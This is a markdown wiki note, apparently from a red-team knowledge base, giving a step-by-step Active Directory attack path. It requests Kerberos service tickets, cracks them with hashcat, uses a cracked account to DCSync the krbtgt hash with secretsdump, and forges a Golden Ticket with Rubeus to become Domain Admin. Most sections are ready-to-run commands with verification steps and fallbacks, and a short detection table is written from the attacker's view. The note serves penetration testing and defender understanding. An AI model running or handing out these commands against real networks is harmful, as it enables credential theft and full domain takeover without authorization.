---
title: "Attack Path: Kerberoasting → Cracked Service Account → DCSync → Domain Admin"
type: note
created: 2026-09-06
updated: 2026-09-06
tags: [attack-path, active-directory, kerberoasting, privilege-escalation]
---

# Attack Path: Kerberoasting → Cracked Service Account → DCSync → Domain Admin

The classic **[[kerberoasting]]** kill-chain: request TGS tickets for
**SPN-owning service accounts**, crack the resulting tickets to recover the
**service account passwords**, and — if one of those accounts holds a
**DCSync right** (`GetChanges`/`GetChangesAll`) — use it to replicate
`krbtgt` and go Golden Ticket → Domain Admin. This is the "low-priv foothold,
no DCSync yet" path: you *earn* the DCSync right by cracking a service
account that already has it. See [[kerberoasting]] for the request + crack
mechanics and [[dcsync]] for the replication right.

## Chain

```
You (low-priv foothold)
  --enumerate SPNs (kerbrute / GetUserSPNs)--> service account list
  --request TGS (RC4) for each SPN account--> kerberoast tickets
  --crack (hashcat 13100)--> a service account's password
  --that account holds GetChanges/GetChangesAll (DCSync)-->
  DCSync krbtgt
  --Golden Ticket--> Domain Admin
```

## Prerequisites / what signals this path exists

- A **low-priv domain foothold** (any valid user) — enough to request TGS
  tickets.
- **SPN-owning service accounts** in the domain — the Kerberoast target list.
- At least one cracked service account that **holds a DCSync right** — this
  is the linchpin. Confirm *before* you rely on it:

```bash
# 1. Enumerate + request TGS for all SPN accounts (hashcat format)
GetUserSPNs.py -dc-ip <dc> corp.local/<you> -request -format hashcat > spn.txt
# (or: kerbrute kerberoast -d corp.local -dc <dc> spns.txt)

# 2. Crack
hashcat -m 13100 spn.txt rockyou.txt

# 3. Does a cracked account hold DCSync? (BloodHound: <svc> -> GetChangesAll)
#    or directly:
Get-ADReplicationPartners -Server <dc>   # from a svc account context
#    / PowerView: check Get-ADObjectAcl for GetChangesAll on the domain object
```

See [[service-principal-name]] for the SPN surface, [[kerberoasting]] for the
request, [[hashcat]] / [[john-the-ripper]] for the crack.

## Step 1 — Kerberoast (request the TGS tickets)

Request a TGS for each SPN-owning account. **Request RC4** (etype `0x17`) so
the tickets are fast to crack — see [[kerberos-encryption-types]].

```bash
GetUserSPNs.py -dc-ip <dc> corp.local/<you> -request -format hashcat > spn.txt
```
**Verify:** `spn.txt` has one `user@domain$...` line per SPN account with a
ticket. If a service account has **AES-only** (no RC4), the ticket is
AES-encrypted — crack with mode `19700`/`19800` instead (slower).

## Step 2 — Crack the tickets

```bash
# RC4 (the common case)
hashcat -m 13100 spn.txt rockyou.txt
# AES128 / AES256 fallback
hashcat -m 19700 spn.txt rockyou.txt
hashcat -m 19800 spn.txt rockyou.txt
```
**Verify:** a cracked `svc_x` password. Record it. If nothing cracks, the
service accounts use strong passwords — fall back to a different path
(ACL, delegation, AD CS).

### Failure modes & fallbacks
- **No RC4 tickets (AES-only domain)** — the domain forces AES for TGS; crack
  `19700`/`19800` (slower) or use a mask/rule attack. See
  [[kerberos-encryption-types]].
- **Strong passwords** — none crack from rockyou; try a mask for the domain's
  password policy, or pivot to a different privesc.
- **The cracked account has no DCSync right** — you have a good service
  account but it doesn't replicate; re-check the BloodHound DCSync edge, or
  use the account for **lateral** (it may be local admin somewhere) or
  **[[overpass-the-hash]]** (its NT hash → real TGT).

## Step 3 — DCSync krbtgt with the cracked service account

```bash
# Prove the right, then dump krbtgt
secretsdump.py -dc-ip <dc> corp.local/svc_x:'<cracked-pw>' -just-dc-user krbtgt
```
**Verify:** output shows `krbtgt` `aes256-cts-hmac-sha1-96`. Save it.
See [[dcsync]].

### Failure modes & fallbacks
- **`PRC_REMOTE_NO_MORE` / replication error** — hitting a read-replica;
  retarget the PDC emulator or another DC.
- **Account locked** after the crack attempts — the service account may be
  locked out; wait for unlock or use a fresh ticket.

## Step 4 — Domain dominance

```powershell
Rubeus.exe asktgt /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /aes256:<krbtgt-aes256> /sids:S-1-5-21-...:512 /ptt
whoami /all   # -> corp.local\administrator + 512
```
See [[golden-silver-tickets]]. **Verify:** `whoami /all` lists
`corp.local\administrator`.

## Detection summary (per step)

| Step | What fires | Your tell |
|------|-----------|-----------|
| 1 (Kerberoast) | **4769 TGS-REQ bursts** for many SPN accounts from one user | bulk service-ticket requests |
| 1 (RC4) | TGS-REQ with **RC4 (`0x17`)** enctype | the RC4 downgrade |
| 3 (DCSync) | **4662** on the domain object (GetChanges+GetChangesAll) | a service account replicating |
| 4 (Golden) | 4768/4624 for Administrator from a non-DC | DA off-DC |

## Cleanup notes
- The Kerberoast tickets are TGSs (short-lived); the trail is the 4769 burst.
- DCSync's trail is 4662. Expect `krbtgt` to rotate twice if caught
  ([[krbtgt]]).
- If the cracked service account is reused, expect it to be reset — the
  password you cracked is then stale.

## Related
- [[kerberoasting]] — the request + crack primitive (steps 1-2)
- [[service-principal-name]] — the SPN target list
- [[hashcat]], [[john-the-ripper]] — the crack engines
- [[kerberos-encryption-types]] — RC4/AES ticket cracking
- [[dcsync]], [[golden-silver-tickets]] — steps 3-4
- [[overpass-the-hash]] — the fallback if the cracked account lacks DCSync
- [[ad-persistence]] — durable access once you're DA
